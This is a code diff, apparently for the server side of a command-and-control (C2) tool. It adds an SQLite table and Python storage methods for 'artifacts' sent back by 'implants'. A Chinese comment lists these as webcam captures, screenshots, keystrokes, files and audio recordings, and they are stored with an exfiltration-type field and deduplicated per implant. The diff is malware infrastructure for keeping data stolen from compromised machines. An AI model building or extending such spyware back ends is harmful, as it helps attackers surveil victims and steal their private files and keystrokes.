@@ -46,6 +46,32 @@ CREATE TABLE IF NOT EXISTS frame_index (
 
 CREATE INDEX IF NOT EXISTS idx_frame_implant
     ON frame_index(implant_id, received_at);
+
+-- 采集产物（摄像头/截图/键盘/文件/录音）
+-- 去重键 (implant_id, generation, seq)：同一产物被重复上报时 INSERT OR IGNORE
+-- 静默跳过，不会产生重复行，也不覆盖已存内容。
+CREATE TABLE IF NOT EXISTS artifacts (
+    id            INTEGER PRIMARY KEY AUTOINCREMENT,
+    implant_id    TEXT NOT NULL,
+    generation    INTEGER NOT NULL,
+    exf_type      INTEGER NOT NULL,
+    seq           INTEGER NOT NULL,
+    ts_us         INTEGER NOT NULL,
+    width         INTEGER NOT NULL,
+    height        INTEGER NOT NULL,
+    flags         INTEGER NOT NULL,
+    name          TEXT NOT NULL,
+    size_bytes    INTEGER NOT NULL,
+    sha256_hex    TEXT NOT NULL,
+    received_at   INTEGER NOT NULL,
+    blob          BLOB NOT NULL,
+    UNIQUE(implant_id, generation, seq)
+);
+
+CREATE INDEX IF NOT EXISTS idx_artifact_implant
+    ON artifacts(implant_id, received_at);
+CREATE INDEX IF NOT EXISTS idx_artifact_type
+    ON artifacts(exf_type, received_at);
 """
 
 
@@ -156,3 +182,101 @@ class Store:
                 (request_id, implant_id, int(__import__("time").time()),
                  fmt, size))
             c.commit()
+
+    # ------------------------------------------------------------------
+    # 采集产物
+    # ------------------------------------------------------------------
+
+    def put_artifact(self, implant_id: str, generation: int, exf_type: int,
+                     seq: int, ts_us: int, width: int, height: int,
+                     flags: int, name: str, blob: bytes) -> Optional[int]:
+        """写入一条采集产物。重复 (implant_id, generation, seq) 返回 None。
+
+        blob 以 BLOB 存入库，不做任何转码；sha256 用于完整性核对与去重查证。
+        """
+        import hashlib as _hl
+        with self._exclusive():
+            c = self._connect()
+            cur = c.execute(
+                """INSERT OR IGNORE INTO artifacts
+                   (implant_id, generation, exf_type, seq, ts_us, width, height,
+                    flags, name, size_bytes, sha256_hex, received_at, blob)
+                   VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)""",
+                (implant_id, generation, exf_type, seq, ts_us, width, height,
+                 flags, name, len(blob),
+                 _hl.sha256(blob).hexdigest(),
+                 int(__import__("time").time()), sqlite3.Binary(blob)))
+            c.commit()
+            if cur.rowcount == 0:
+                return None
+            return cur.lastrowid
+
+    def get_artifact(self, artifact_id: int) -> Optional[dict]:
+        with self._exclusive():
+            c = self._connect()
+            row = c.execute(
+                """SELECT id, implant_id, generation, exf_type, seq, ts_us,
+                          width, height, flags, name, size_bytes, sha256_hex,
+                          received_at, blob
+                   FROM artifacts WHERE id=?""", (artifact_id,)).fetchone()
+        return self._row_to_dict(row)
+
+    def list_artifacts(self, implant_id: Optional[str] = None,
+                       exf_type: Optional[int] = None,
+                       limit: int = 100) -> list:
+        sql = """SELECT id, implant_id, generation, exf_type, seq, ts_us,
+                        width, height, flags, name, size_bytes, sha256_hex,
+                        received_at, blob
+                 FROM artifacts"""
+        where, args = [], []
+        if implant_id is not None:
+            where.append("implant_id=?")
+            args.append(implant_id)
+        if exf_type is not None:
+            where.append("exf_type=?")
+            args.append(exf_type)
+        if where:
+            sql += " WHERE " + " AND ".join(where)
+        sql += " ORDER BY received_at DESC, id DESC LIMIT ?"
+        args.append(limit)
+        with self._exclusive():
+            c = self._connect()
+            rows = c.execute(sql, args).fetchall()
+        return [self._row_to_dict(r) for r in rows]
+
+    def count_artifacts(self, implant_id: Optional[str] = None,
+                        exf_type: Optional[int] = None) -> int:
+        sql = "SELECT COUNT(*) FROM artifacts"
+        where, args = [], []
+        if implant_id is not None:
+            where.append("implant_id=?")
+            args.append(implant_id)
+        if exf_type is not None:
+            where.append("exf_type=?")
+            args.append(exf_type)
+        if where:
+            sql += " WHERE " + " AND ".join(where)
+        with self._exclusive():
+            c = self._connect()
+            return int(c.execute(sql, args).fetchone()[0])
+
+    def delete_artifacts(self, implant_id: str) -> int:
+        """按 implant 清除产物，返回删除行数。"""
+        with self._exclusive():
+            c = self._connect()
+            cur = c.execute("DELETE FROM artifacts WHERE implant_id=?",
+                            (implant_id,))
+            c.commit()
+            return int(cur.rowcount)
+
+    @staticmethod
+    def _row_to_dict(row) -> Optional[dict]:
+        if row is None:
+            return None
+        return {
+            "id": row[0], "implant_id": row[1], "generation": row[2],
+            "exf_type": row[3], "seq": row[4], "ts_us": row[5],
+            "width": row[6], "height": row[7], "flags": row[8],
+            "name": row[9], "size_bytes": row[10], "sha256_hex": row[11],
+            "received_at": row[12], "blob": bytes(row[13]),
+        }
